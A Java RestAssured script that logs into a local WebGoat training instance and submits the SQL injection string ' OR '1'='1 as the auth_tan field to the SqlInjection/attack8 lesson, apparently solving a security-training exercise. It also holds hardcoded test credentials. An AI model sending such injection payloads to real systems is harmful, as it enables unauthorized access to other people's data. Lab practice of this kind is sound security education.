package tests;

import io.restassured.RestAssured;
import io.restassured.http.ContentType;
import io.restassured.response.Response;

public class LoginApiTest {

    public static void main(String[] args) {
    	String jSessionId="" ;
        String baseUrl = "http://localhost:8080"; // Replace with your test environment URL
        String username = "shivamkathayat"; // Replace with a valid test user
        String password = "1234567"; // Replace with a valid password (avoid hardcoding in production)

        // Login request with form data
        Response response = RestAssured.given()
                .baseUri(baseUrl)
                .basePath("/WebGoat/login")
                .contentType(ContentType.URLENC)
                .formParam("username", username)
                .formParam("password", password)
                .when()
                .post();

        // Validate status code (200 for success, adjust as needed)
        response.then().assertThat().statusCode(302);

        // Handle cookies (demonstration, replace with appropriate logic)
        jSessionId = response.cookie("JSESSIONID");
        System.out.println("Received JSESSIONID: " + jSessionId);
        
       
        String name = "A";
        String authTan = "' OR '1'='1"; // Replace with a valid auth_tan value

        Response response2 = RestAssured.given()
                .baseUri(baseUrl)
                .basePath("/WebGoat/SqlInjection/attack8")
                .contentType(ContentType.URLENC)
                .cookie("JSESSIONID", jSessionId) // Assuming JSESSIONID is required
                .formParam("name", name)
                .formParam("auth_tan", authTan)
                .when()
                .post();

        // Validate status code (200 for success, adjust as needed)
        response2.then().assertThat().statusCode(200);

        // Subsequent requests might require the JSESSIONID (not shown here)
    }
}